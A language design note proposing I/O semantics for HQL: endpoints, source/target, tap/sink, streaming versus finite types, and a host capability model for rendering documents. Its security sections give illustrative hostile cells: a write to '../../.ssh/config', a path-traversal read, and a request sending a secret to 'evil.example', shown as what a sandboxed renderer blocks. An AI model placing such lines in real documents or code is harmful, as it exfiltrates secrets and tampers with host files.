> Companion note of [HQL-0021](README.md), which states the decision. Where
> they differ, the record holds: a `Seq` is already a `Stream`, so `sink`
> takes one without `emit`; a `tee` branch over a stream ends in `sink`, not
> `target`; and `source(endpoint, Format)` and `tap` are the record's
> sections of those names.

I would center the model on one distinction: **endpoints are byte locations; `source` and `target` give those bytes typed meaning**. `stdin`, `stdout`, and `file("…")` are endpoint values supplied or constructed without performing I/O. `source(stdin, Json)` turns an input endpoint into a live typed source; `source(file("x.json"), Json)` turns a replayable endpoint into a finite typed source; `source("warehouse")` resolves a configured source whose endpoint, format, element type, and source contract come from configuration. The output-side dual is one new concept, `target(endpoint, Format)`: a pipeline stage that consumes values and writes their formatted representation. Everything else—streaming, batching, JSON Lines, multiple outputs—should fall out of `Stream`, `Seq`, `emit`, `collect`, and `tee`.

The important part is that I would **not** add `read`, `write`, `open`, `input`, `inputs`, `JsonLines`, or an I/O namespace.

---

# 1. The core syntax

The two new pieces I think earn their place are:

```hql
file("birds.json")
target(file("result.json"), Json)
```

`file(path)` creates an endpoint description. It does no I/O.

`target(endpoint, Format)` is the output dual of:

```hql
source(endpoint, Format)
```

So the basic symmetry is:

```hql
source(stdin, Json)
```

and:

```hql
value
| target(stdout, Json)
```

or:

```hql
value
| target(file("result.json"), Json)
```

A target terminates its branch:

```text
target<T>(Endpoint, Format) : T -> Unit
```

That detail is useful because `tee` already provides exactly the operation needed for side outputs.

---

# 2. Concrete programs

I will use one small CLI convenience throughout:

```bash
hql '<expr>'
```

as shorthand for:

```bash
hql eval '<expr>'
```

Nothing semantic depends on it.

## 2.1 `jq .`

Input:

```json
{"name":"owl","count":3}
```

Command:

```bash
echo '{"name":"owl","count":3}' |
  hql 'source(stdin, Json)' --to json
```

Output:

```json
{
  "name": "owl",
  "count": 3
}
```

There is no special implicit input object. The program says exactly where its data comes from.

---

## 2.2 JSON → YAML

```bash
echo '{"name":"owl","count":3}' |
  hql 'source(stdin, Json)' --to yaml
```

Output:

```yaml
name: owl
count: 3
```

Notice the useful distinction:

```hql
source(stdin, Json)
```

controls **decoding**.

```text
--to yaml
```

controls rendering of the **program result**.

---

## 2.3 Field from one JSON document

```bash
echo '{"species":"barn owl","count":4}' |
  hql '
    source(stdin, Json)
    | map(s => s.species)
  '
```

Output:

```hql
"barn owl"
```

`stdin` is streaming, so formally this is a one-element stream. The CLI prints stream elements as they arrive.

That gives you jq-like ergonomics without pretending stdin is replayable.

---

## 2.4 Filtering an endless JSON stream

Suppose something emits:

```text
{"species":"owl","count":1}
{"species":"eagle","count":7}
{"species":"robin","count":2}
{"species":"hawk","count":5}
...
```

Run:

```bash
bird_feed |
  hql '
    source(stdin, Json)
    | filter(s => s.count > 2)
  ' --to json
```

Output begins immediately:

```json
{"species":"eagle","count":7}
{"species":"hawk","count":5}
```

and the HQL process remains alive.

There is no `JsonLines` type here.

The rule is:

> Formatting a `Stream<T>` using `Json` produces or consumes a sequence of JSON documents.

On output this naturally appears as JSON Lines.

On input the JSON decoder incrementally recognizes complete top-level JSON documents.

That makes these inverses:

```hql
Stream<Data>
| target(stdout, Json)
```

and:

```hql
source(stdin, Json)
```

---

## 2.5 One JSON array is still one JSON document

This matters:

```bash
echo '[1, 2, 3]' |
  hql 'source(stdin, Json)'
```

The source contains **one item**:

```hql
[1, 2, 3]
```

not three stream items.

If you want the contents to become the stream, that is what `emit` is for:

```bash
echo '[1, 2, 3]' |
  hql '
    source(stdin, Json)
    | emit
  '
```

Output:

```text
1
2
3
```

This is a very important separation:

```text
format controls document boundaries
emit/collect control HQL collection boundaries
```

Do not make JSON arrays magically become streams.

---

## 2.6 CSV with a typed view

Assume:

```csv
species,count
owl,4
robin,1
eagle,7
```

HQL:

```hql
type Sighting {
    species: String,
    count: Int
}

sightings : Stream<Sighting> =
    source(stdin, Csv)

sightings
| filter(s => s.count > 2)
| map(s => s.species)
```

Command:

```bash
cat sightings.csv |
  hql run birds.hql
```

Output:

```hql
"owl"
"eagle"
```

I would make this **bidirectionally typed decoding**.

Without contextual typing:

```hql
source(stdin, Csv)
```

has a generic row representation, probably:

```text
Stream<Map<String, Text>>
```

But:

```hql
x : Stream<Sighting> = source(stdin, Csv)
```

asks the CSV decoder to produce `Sighting`.

The compiler still knows the complete static type. Invalid actual CSV data is a decode error at runtime, not a type-checking failure.

The same mechanism can eventually work for JSON:

```hql
config : Stream<Config> =
    source(stdin, Json)
```

No separate schema API is necessary.

---

## 2.7 Read a file

```hql
birds = source(file("birds.json"), Json)

birds
| map(x => x.species)
```

Command:

```bash
hql run query.hql
```

If `birds.json` contains:

```json
{"species":"owl"}
```

output is:

```hql
"owl"
```

The major difference from stdin is static source contract:

```text
stdin       -> live, non-replayable
file(...)   -> finite, replayable
```

So conceptually:

```hql
source(stdin, Json)
```

is a:

```text
LiveSource<Data>
```

and stands in expressions as:

```text
Stream<Data>
```

while:

```hql
source(file("birds.json"), Json)
```

is a:

```text
FiniteSource<Data>
```

and stands as:

```text
Seq<Data>
```

A normal JSON file therefore yields a one-element sequence containing one JSON document.

---

## 2.8 Extension inference

This should work:

```hql
birds = source(file("birds.json"))
```

and mean exactly:

```hql
birds = source(file("birds.json"), Json)
```

Likewise:

```hql
source(file("birds.csv"))
source(file("config.yaml"))
source(file("README.md"))
```

But inference is only allowed where it is statically knowable.

This is okay:

```hql
source(file("./birds.json"))
```

This is not:

```hql
path = some_runtime_string
source(file(path))
```

The latter must say:

```hql
source(file(path), Json)
```

because type checking cannot depend on a filename discovered at runtime.

---

## 2.9 Read two files

Suppose:

`birds.json`:

```json
{"owl": 4, "eagle": 2}
```

`habitats.json`:

```json
{"owl": "forest", "eagle": "mountain"}
```

Program:

```hql
birds = source(file("birds.json"), Json)
habitats = source(file("habitats.json"), Json)

{
    sightings: birds[0],
    habitats: habitats[0],
}
```

Run:

```bash
hql run report.hql --to json
```

Output:

```json
{
  "sightings": {
    "owl": 4,
    "eagle": 2
  },
  "habitats": {
    "owl": "forest",
    "eagle": "mountain"
  }
}
```

Nothing special was added for multiple inputs. They are just expressions.

---

# 3. Output

This is where I think `target` earns its existence.

## 3.1 Write one result to a file

```hql
report = {
    species: "owl",
    sightings: 14,
}

report
| target(file("report.json"), Json)
```

Run:

```bash
hql run report.hql
```

stdout:

```text
<empty>
```

File:

```bash
cat report.json
```

```json
{
  "species": "owl",
  "sightings": 14
}
```

The program's result is `Unit`.

This prevents a nasty ambiguity between "I produced a value" and "I performed output".

---

## 3.2 Write JSON Lines

Suppose:

```hql
birds : Seq<Bird> = ...
```

This:

```hql
birds
| target(file("birds.json"), Json)
```

writes one JSON array.

But:

```hql
birds
| emit
| target(file("birds.jsonl"), Json)
```

writes:

```json
{"species":"owl","count":4}
{"species":"eagle","count":7}
```

This is exactly the distinction I would preserve.

No `JsonLines` format is necessary.

`Json` describes representation.

`Stream<T>` describes framing.

---

## 3.3 Several outputs from one program

This is where `tee` becomes substantially more useful.

```hql
sightings =
    source(file("sightings.csv"))

sightings
| tee raw =
    target(file("all.json"), Json)
| filter(s => s.count > 2)
| tee interesting =
    target(file("interesting.json"), Json)
| map(s => s.species)
```

Run:

```bash
hql run report.hql
```

The final program result is the filtered species.

Meanwhile the branches create:

```text
all.json
interesting.json
```

I would not invent a special:

```hql
outputs { ... }
```

construct.

You already designed the language feature needed to express this: `tee`.

---

## 3.4 Several streaming outputs

More interesting:

```hql
source(stdin, Json)
| tee archive =
    target(file("events.jsonl"), Json)
| filter(e => e.level == "error")
| tee errors =
    target(file("errors.jsonl"), Json)
| map(e => e.message)
| target(stdout, Text)
```

Command:

```bash
event_source |
  hql run errors.hql
```

stdout:

```text
database timeout
connection refused
```

At the same time:

```text
events.jsonl
errors.jsonl
```

are written incrementally.

No collection is forced anywhere.

---

# 4. A document cell

Suppose:

```text
docs/
    report.md
    data/
        birds.json
```

`report.md`:

````markdown
# Bird report

```hql
birds = source(file("./data/birds.json"))

birds
| map(b => b.species)
```
````

Run:

```bash
hql render docs/report.md
```

The important rule should be:

> Relative file endpoints are resolved relative to the source unit containing the expression.

So:

```hql
file("./data/birds.json")
```

inside `docs/report.md` means:

```text
docs/data/birds.json
```

not:

```text
$PWD/data/birds.json
```

This matters enormously once HQL documents are portable.

The same rule should apply to:

```bash
hql run foo/bar/query.hql
```

Relative files resolve against `foo/bar/`.

For:

```bash
hql eval '...'
```

the source unit has no file location, so its base is the process working directory.

---

# 5. Typing model

I would make the type rule mostly depend on **endpoint capability**, not format.

Conceptually:

| Expression | Contract | Expression type |
|---|---|---|
| `source(stdin, F)` | `LiveSource<T>` | `Stream<T>` |
| `source(file(p), F)` | `FiniteSource<T>` | `Seq<T>` |
| `source("id")` | configured | configured |
| `target(stdout, F)` | live target | `T -> Unit` |
| `target(file(p), F)` | finite/rewrite target | `T -> Unit` |

The actual endpoint-capability types do not necessarily need user-facing names.

The important thing is that the checker knows:

```text
stdin:
    readable
    live
    non-replayable

stdout:
    writable
    live

file(...):
    readable
    writable
    finite
    replayable when read
```

Thus this is rejected statically:

```hql
source(stdout, Json)
```

and so is:

```hql
42 | target(stdin, Json)
```

---

# 6. One document versus many

This is the part I would be particularly strict about.

Formats decode **documents**.

Endpoints determine whether there can be a sequence of documents.

So:

```text
{"a":1}
```

is one `Json` document.

And:

```text
{"a":1}
{"a":2}
{"a":3}
```

is three consecutive `Json` documents.

Therefore:

```hql
source(stdin, Json)
```

can produce:

```text
Stream<Data>
```

with either one or arbitrarily many elements.

A file is finite, so:

```hql
source(file("x.json"), Json)
```

produces:

```text
Seq<Data>
```

whose length happens to be 1 for an ordinary JSON file.

This looks slightly unusual initially, but I think it is the right consequence of your model.

Critically, this:

```json
[1, 2, 3]
```

remains **one document**.

It does not magically produce three HQL elements.

That requires:

```hql
source(stdin, Json)
| emit
```

This keeps format semantics and collection semantics completely separate.

---

# 7. Formats and filename inference

I would define inference as simple compile-time sugar:

```hql
source(file("x.json"))
```

becomes:

```hql
source(file("x.json"), Json)
```

and:

```hql
target(file("x.yaml"))
```

becomes:

```hql
target(file("x.yaml"), Yaml)
```

Likely mappings:

```text
.json        Json
.jsonl       Json
.yaml/.yml   Yaml
.csv         Csv
.txt         Text
.md          Markdown
.hql         Hql
.d2          D2
.mmd         Mermaid
```

I deliberately map:

```text
.jsonl -> Json
```

rather than inventing `JsonLines`.

The stream type determines that multiple JSON documents are involved.

An extension is therefore a **format hint**, not a type.

Explicit always wins:

```hql
source(file("strangely_named.data"), Json)
```

and:

```hql
target(file("result.txt"), Json)
```

should also be legal.

---

# 8. Effects

I think this should finally give your existing `Effectful` level a job.

These expressions are effectful:

```hql
source(stdin, Json)
source(file("x.json"), Json)
source("warehouse")

target(stdout, Json)
target(file("x.json"), Json)
```

But an important distinction:

```hql
file("x.json")
```

is pure.

It only constructs an endpoint value.

Likewise:

```hql
target(file("x.json"), Json)
```

can be regarded as constructing an effectful pipeline stage; the actual effect happens when that stage is evaluated with an input.

That gives you a clean execution model.

---

## The compiler does not perform effects

The checker can derive:

```text
Pure
Effectful
```

through the expression graph.

For example:

```hql
fn normalize(x: Bird) : Bird = ...
```

is pure.

But:

```hql
fn load() : Seq<Bird> =
    source(file("birds.json"), Json)
```

has an `Effectful` effect.

This should propagate transitively.

So you can know **before execution**:

```text
this program may access external endpoints
```

and ideally which endpoint capabilities it requests.

---

# 9. The host performs effects

This is the key security boundary.

HQL evaluates:

```hql
source(file("./foo.json"), Json)
```

by asking its host:

```text
resolve/read this endpoint
```

and:

```hql
x | target(file("./foo.json"), Json)
```

by asking:

```text
write this endpoint
```

The HQL runtime itself should not assume unrestricted filesystem access.

The host owns an effect policy.

Conceptually:

```text
read stdin       allow
write stdout     allow

read file        allow under ...
write file       deny

configured source warehouse   allow
network endpoint              deny
```

You do not need to expose that whole policy language in HQL 1.0.

It is a host API.

---

# 10. `hql render` should be read-only

For documents I would choose a strong default:

```text
hql render
```

allows:

```text
document-local file reads
configured read-only sources, if explicitly enabled by host
```

but rejects:

```hql
target(file(...), ...)
target(stdout, ...)
```

before running the document.

Thus a malicious Markdown file cannot contain:

```hql
"oops"
| target(file("../../.ssh/config"), Text)
```

and mutate the host.

Even better, the render host can expose a virtual root:

```text
docs/
```

and reject file access escaping it.

So:

```hql
source(file("./data.json"))
```

works.

But:

```hql
source(file("../../secret"))
```

can be denied by the host.

This should not be a peculiarity of `file()`. It follows from the generic endpoint capability model.

That becomes valuable later for things like:

```text
postgres
kafka
http
s3
```

because exactly the same authorization boundary remains.

---

# 11. CLI

I would keep this surprisingly small.

Existing:

```text
hql eval
hql run
hql check
hql render
hql repl
--to
```

Add only the jq-style expression shorthand:

```bash
hql 'source(stdin, Json) | ...'
```

equivalent to:

```bash
hql eval 'source(stdin, Json) | ...'
```

I would **not** add:

```text
--from json
--input
--input-file
--output
--output-file
--json
--yaml
```

Those all duplicate language semantics.

Input belongs in the program:

```hql
source(stdin, Json)
source(file("foo.json"))
```

Output belongs either in the program:

```hql
target(file("foo.json"), Json)
```

or is the host's rendering of the final value:

```bash
--to json
```

That's an elegant distinction:

```text
source / target   program semantics
--to            presentation of program result
```

---

# 12. Final-result stdout versus `target(stdout, …)`

These should deliberately remain different.

This:

```bash
hql 'some_expression' --to json
```

means:

> Evaluate the program and ask the CLI host to render its result as JSON.

Whereas:

```hql
something
| target(stdout, Json)
```

means:

> Writing stdout is part of this HQL program's execution.

That difference matters for:

```hql
tee
```

and streams.

For example:

```hql
events
| tee audit =
    target(stdout, Json)
| summarize(...)
```

can produce streaming output before the overall program completes.

`--to` cannot mean that; it belongs to the resulting value.

---

# 13. A useful consequence for HyperMarkdown

This model gets particularly interesting in documents because ordinary cell output remains pure:

````markdown
```hql
source(file("./measurements.csv"))
| filter(...)
| summarize(...)
```
````

The expression's result is embedded into the document by the render host.

It does **not** need:

```hql
target(...)
```

at all.

So you get a clean distinction:

```text
cell result
    -> content generated by the document

target(...)
    -> external side effect
```

And `hql render` can categorically reject the latter.

That is a very good security property.

---

# 14. The resulting conceptual model

I think the model can be reduced to this:

```text
                    bytes
                      │
                      ▼
endpoint ── source(endpoint, Format) ──> typed HQL values
                                                │
                                                │ normal HQL
                                                │ pipelines
                                                ▼
endpoint <── target(endpoint, Format) <── typed HQL values
```

Endpoint examples:

```hql
stdin
stdout
file("./foo.json")
```

Configured source:

```hql
source("warehouse")
```

is simply the preconfigured form where endpoint + format + type + source contract are already known.

And cardinality remains an orthogonal HQL concern:

```text
Seq<T>     finite collection
Stream<T>  incremental collection

collect    Stream -> Seq
emit       Seq -> Stream
```

That separation is the strongest aspect of the design.

---

# 15. Three weak points

### 1. `source(file("x.json"), Json)` returning `Seq<Data>` is slightly surprising

For a conventional JSON file people may instinctively expect:

```text
Data
```

rather than:

```text
Seq<Data> // containing one document
```

But I would accept this cost.

Special-casing files into "sometimes scalar, sometimes sequence" would damage the model far more. Once JSON Lines, YAML multi-documents, and streaming input exist, **documents as source elements** is the clean invariant.

And ordinary pipeline syntax hides much of the inconvenience:

```hql
source(file("bird.json"))
| map(b => b.species)
```

still looks natural.

---

### 2. `Json` meaning both normal JSON and JSON Lines needs excellent documentation

Technically I think it is right:

```text
Json = representation
Stream = framing/cardinality
```

and therefore:

```hql
Stream<T> | format(..., Json)
```

naturally gives JSON Lines.

But many users think "JSONL" is itself a format.

HQL would need to explain this once, very clearly:

> JSON Lines is not another data type in HQL. It is JSON applied piecewise to a stream.

That is conceptually stronger, but initially less familiar.

---

### 3. Effectful `tee` branches make execution semantics important

This:

```hql
stream
| tee a = target(file("a.jsonl"), Json)
| tee b = target(file("b.jsonl"), Json)
| ...
```

raises questions you can postpone only briefly:

- are targets run synchronously?
- what happens if one blocks?
- what happens if one fails?
- does a failed side target cancel the main pipeline?
- are multiple writes ordered?
- what happens with backpressure?

Those are not reasons to change the syntax. In fact, I think the syntax is exactly right.

But once `target` exists, HQL's existing `Stream` execution model becomes externally observable, so those semantics will eventually need an ADR.

---

The design I would commit to is therefore essentially **one endpoint constructor and one source dual**:

```hql
file(path)

source(endpoint, Format)
target(endpoint, Format)
```

with:

```hql
stdin
stdout
```

host-bound endpoint values, `source("id")` remaining the configured-source shortcut, formats remaining exactly the types you already have, and `Seq`/`Stream`—not special I/O APIs—carrying the distinction between finite values, JSON documents, JSON Lines, and continuous data.
---

I’d extend the same endpoint model to networking rather than introduce an HTTP-specific I/O subsystem.

The core idea becomes: **network locations are endpoints too**. `source(endpoint, Format)` decodes bytes arriving from them; `target(endpoint, Format)` encodes values and sends bytes to them. HTTP request metadata belongs on the endpoint description, not in `source` or `target`.

For example:

```hql
source(
    http("https://api.example.com/birds"),
    Json
)
```

That should be the direct network analogue of:

```hql
source(file("birds.json"), Json)
```

The difference is in endpoint capabilities:

```text
file(...)   finite, replayable
http(...)   request/response, finite response
stdin       live, non-replayable
```

A normal HTTP GET therefore probably gives a finite source:

```hql
source(http("https://api.example.com/birds"), Json)
    : Seq<Data>
```

If the response body contains one JSON document, the sequence has one element. If the server returns multiple top-level JSON documents, there can be multiple elements. Again, `Json` does not determine stream-vs-whole.

For request configuration, I would resist turning `http()` into a giant procedural API. Give the endpoint a small structural configuration:

```hql
birds = http(
    "https://api.example.com/birds",
    {
        method: "GET",
        headers: {
            authorization: "Bearer " + token
        }
    }
)

source(birds, Json)
```

For the common case:

```hql
source(http("https://api.example.com/birds"), Json)
```

should imply GET.

POST then becomes naturally complementary:

```hql
report
| target(
    http(
        "https://api.example.com/report",
        {method: "POST"}
    ),
    Json
)
```

That is attractive because the data itself stays in the pipeline:

```text
HQL value
    ↓
target(...)
    ↓
HTTP request body
```

rather than:

```hql
post(url, body)
```

which would start recreating an HTTP library inside the language.

There is one complication, though: HTTP is not quite a pure source/target pair because the **response to a POST is itself data**. You often want:

```text
request value → network → response value
```

not merely a side effect.

I would therefore add exactly one network operation beyond `source`/`target`, but only if needed: something like `request(endpoint, Format, Format)` would be tempting, yet I think it damages the model.

A better fit may be to treat the HTTP endpoint as a bidirectional endpoint and let `target` return a response source:

```hql
response =
    payload
    | target(
        http("https://api.example.com/search", {method: "POST"}),
        Json
    )

source(response, Json)
```

Conceptually:

```text
target(HttpEndpoint, Json)
    : RequestBody -> HttpResponseEndpoint
```

whereas:

```text
target(stdout, Json)
    : T -> Unit
```

That is type-correct but maybe too clever. I would probably **not do this in HQL 1.0**.

Instead I would initially keep `target(http(...))` for one-way/ignored-response operations and model request/response HTTP as a configured source or extension. Otherwise `target` suddenly stops having a stable semantic meaning.

For continuous networking, the existing stream model becomes especially useful. A WebSocket or server-sent-event endpoint is naturally live:

```hql
events =
    source(
        websocket("wss://events.example.com"),
        Json
    )
```

with:

```text
Stream<Data>
```

Then:

```hql
events
| filter(e => e.kind == "alert")
| collect(100)
| target(file("alerts.jsonl"), Json)
```

works with no special network semantics.

Kafka similarly remains cleaner as a configured endpoint/source:

```hql
source("orders")
```

with the config declaring something equivalent to:

```text
kind = kafka
topic = orders
format = json
element_type = Order
```

and giving:

```text
Stream<Message<Order>>
```

or your existing replayable `StreamSource<T>` contract.

For raw TCP/Unix sockets I’d only add them when there is a concrete use case:

```hql
source(tcp("host", 9000), Json)
```

but this immediately exposes framing questions. TCP has bytes, not messages. You would need an explicit framing layer—newline, length prefix, delimiter, etc.—and I would not smuggle that into `Json`. HTTP/WebSocket/Kafka already give you meaningful message boundaries.

The security model is where networking fits particularly nicely. `http(...)` itself is pure: it only describes an endpoint.

```hql
api = http("https://example.com/data")
```

No network request has happened.

The effect happens at:

```hql
source(api, Json)
```

or:

```hql
value | target(api, Json)
```

and the host can reject it before execution according to capability:

```text
network.read
network.write
network.host("api.example.com")
```

So `hql render untrusted.md` can simply run with:

```text
file.read: document root
file.write: denied
network: denied
stdout/stderr: controlled by renderer
```

and a cell containing:

```hql
source(http("https://evil.example/upload?secret=..."), Json)
```

fails because the host does not grant network access.

I would also keep secrets out of HQL source code. Instead of encouraging:

```hql
headers: {
    authorization: "Bearer abc123..."
}
```

there should eventually be some host-provided secret/config value, perhaps:

```hql
config.api_token
```

or a configured endpoint:

```hql
source("github")
```

where authentication is outside the program entirely. That is especially important for HyperMarkdown documents.

So I think the networking hierarchy should stay quite small:

```hql
// ordinary HTTP response
source(http("https://example.com/data"), Json)

// live network source
source(websocket("wss://example.com/events"), Json)

// send data
value
| target(http(
    "https://example.com/events",
    {method: "POST"}
), Json)
```

with configured infrastructure remaining:

```hql
source("orders")
source("warehouse")
```

The strongest rule remains the same:

> **The endpoint describes transport and capabilities; the format describes encoding; the HQL type describes scalar/sequence/stream/batch.**

So networking does not add a new data model. It just adds more kinds of endpoints.

The one thing I would deliberately postpone is full HTTP request/response composition. GET-like reads and fire-and-handle-status writes fit `source`/`target` beautifully; POST-with-a-typed-response is the first place where that symmetry starts to strain, and I would not distort `target` just to force it into the model.

---
Yes. I think `tap` / `sink` can give you a very clean second axis without undoing the settled:

```hql
source(stdin, Json)
```

I would make the distinction this:

```text
source / target   describe endpoints as data I/O
tap / sink        describe streaming attachment to those endpoints
```

So `source` and `target` remain the general concepts, while `tap` and `sink` are specifically about **incremental flow**.

The nice part is that you can make this visible in the type system rather than just vocabulary.

## Ingress

A finite/replayable source:

```hql
source(file("birds.json"), Json)
```

could give:

```text
Seq<Data>
```

A live endpoint:

```hql
source(stdin, Json)
```

gives:

```text
Stream<Data>
```

That remains your anchor.

But now `tap` becomes useful when you want to explicitly turn some endpoint/source into a live stream:

```hql
tap(http("https://example.com/events"), Json)
```

or:

```hql
tap("orders")
```

with:

```text
Stream<Event>
```

Semantically:

> `tap` means: subscribe to this endpoint and yield values as they become available.

That makes it especially natural for:

```hql
tap(stdin, Json)
tap(websocket("wss://..."), Json)
tap("kafka-orders")
```

But I would **not require** it for stdin, because you've already established:

```hql
source(stdin, Json)
```

So `source()` is the general constructor, while `tap()` is the explicit streaming form.

You could even define:

```text
source(live_endpoint, F) ≡ tap(live_endpoint, F)
```

conceptually, without necessarily making it syntactic sugar in the implementation.

---

# Output side

Here the terminology becomes even stronger.

A materialized value goes to a `target`:

```hql
report
| target(file("report.json"), Json)
```

Meaning:

> Produce this result at that destination.

Whereas a stream goes into a `sink`:

```hql
events
| sink(stdout, Json)
```

Meaning:

> Consume values continuously as they arrive.

So you get this very intuitive matrix:

| | Input | Output |
|---|---|---|
| materialized/general | `source` | `target` |
| streaming | `tap` | `sink` |

That feels much better to me than making `source`/`target` carry every nuance.

---

# Examples

### Whole-ish file processing

```hql
birds =
    source(file("birds.json"), Json)

birds
| filter(b => b.count > 2)
| target(file("filtered.json"), Json)
```

Conceptually:

```text
Seq<Bird> -> Seq<Bird>
```

The whole result can be completed before writing.

---

### stdin → stdout stream

```hql
source(stdin, Json)
| filter(e => e.level == "error")
| sink(stdout, Json)
```

Types:

```text
Stream<Data>
    -> Stream<Data>
    -> Unit
```

This now reads very naturally:

> source the input, process it, sink the stream.

---

### Explicit live tap

For Kafka:

```hql
orders =
    tap("orders")

orders
| filter(o => o.total > 1000)
| sink("large-orders")
```

This is almost domain language:

```text
tap orders
sink large-orders
```

And importantly it communicates something that:

```hql
source("orders")
```

doesn't communicate visually: this may run forever.

---

# Batch fits cleanly between tap and sink

This is where the vocabulary becomes particularly good.

```hql
tap("events")
| collect(100)
| sink("analytics")
```

Types:

```text
Stream<Event>
    ↓ collect(100)
Stream<Seq<Event>>
    ↓
sink
```

So the sink receives batches.

Nothing special called `batch_sink` is required.

And:

```hql
tap("events")
| collect
| target(file("events.json"), Json)
```

has different semantics:

```text
Stream<Event>
    ↓ collect
Seq<Event>
    ↓
target
```

This gives a really nice semantic distinction:

```hql
tap(...)
| collect(100)
| sink(...)
```

means:

> continuously move batches.

Whereas:

```hql
source(...)
| ...
| target(...)
```

means:

> produce a finite result.

That's a strong conceptual pair.

---

# `emit` gives the reverse transition

You then get a little algebra:

```text
source              Seq<T>
tap                 Stream<T>

collect             Stream<T> -> Seq<T>
collect(n)          Stream<T> -> Stream<Seq<T>>
emit                Seq<T> -> Stream<T>

target              T/Seq<T> -> Unit
sink                Stream<T> -> Unit
```

For example:

```hql
source(file("birds.json"), Json)
| emit
| sink(stdout, Json)
```

means:

> read a finite dataset, turn it into a stream, and stream it to stdout.

And:

```hql
source(stdin, Json)
| collect
| target(file("all.json"), Json)
```

means:

> consume stdin until EOF, materialize it, then write one result.

These are semantically very different, and the vocabulary makes that obvious.

---

# A subtle point: `sink(stdout, Json)` versus `target(stdout, Json)`

I would actually allow both, because they mean different things.

Given:

```hql
items : Seq<Item>
```

this:

```hql
items
| target(stdout, Json)
```

writes one JSON value:

```json
[
  {"id":1},
  {"id":2}
]
```

But:

```hql
items
| emit
| sink(stdout, Json)
```

writes incrementally:

```json
{"id":1}
{"id":2}
```

Likewise, if you already have:

```text
Stream<Item>
```

then:

```hql
stream
| sink(stdout, Json)
```

is natural.

I would probably reject:

```hql
stream
| target(stdout, Json)
```

unless the stream was first collected.

That is valuable because `target` now implies something concrete:

> a target receives a completed value.

And `sink` means:

> a sink consumes a stream.

That distinction is stronger than merely having two synonyms.

---

# Then what about `source(stdin, Json)`?

This is the one slight asymmetry, but I think it is okay.

You have settled:

```hql
source(stdin, Json)
```

and I would keep it.

Its type is:

```text
Stream<Data>
```

because the endpoint determines the source contract.

So `source` remains the general entry point.

`tap` becomes the **intentional streaming specialization**:

```hql
tap(stdin, Json)
tap("orders")
tap(websocket(...), Json)
```

Essentially:

```text
source = obtain data from an endpoint
tap    = subscribe to an endpoint as a stream
```

The compiler can even resolve both through the same internal source abstraction.

That means `tap` earns its place semantically without forcing you to throw away the extremely nice:

```hql
source(stdin, Json)
```

---

# I would settle on this vocabulary

```hql
// general / finite input
source(file("birds.json"), Json)

// general source whose contract happens to be live
source(stdin, Json)

// explicitly streaming input
tap(stdin, Json)
tap("orders")

// completed output
value
| target(file("result.json"), Json)

// continuous output
stream
| sink(stdout, Json)

stream
| collect(100)
| sink("batches")
```

And the conceptual model becomes:

```text
                    HQL DATA MODEL

       ingress                         egress

 source(endpoint)                  target(endpoint)
       │                                ▲
       │ Seq<T> / T                     │ T / Seq<T>
       ▼                                │

                collect / emit

       ▲                                │
       │ Stream<T>                      │ Stream<T>
       │                                ▼
 tap(endpoint)                     sink(endpoint)


        finite/materialized  ↔  streaming
```

I especially like the resulting phrases:

```hql
tap("orders")
| filter(...)
| collect(100)
| sink("warehouse")
```

versus:

```hql
source(file("orders.csv"))
| aggregate(...)
| target(file("report.json"), Json)
```

They describe two genuinely different execution modes without introducing new container types. `Seq<T>`, `Stream<T>`, and `Stream<Seq<T>>` already carry the actual semantics.
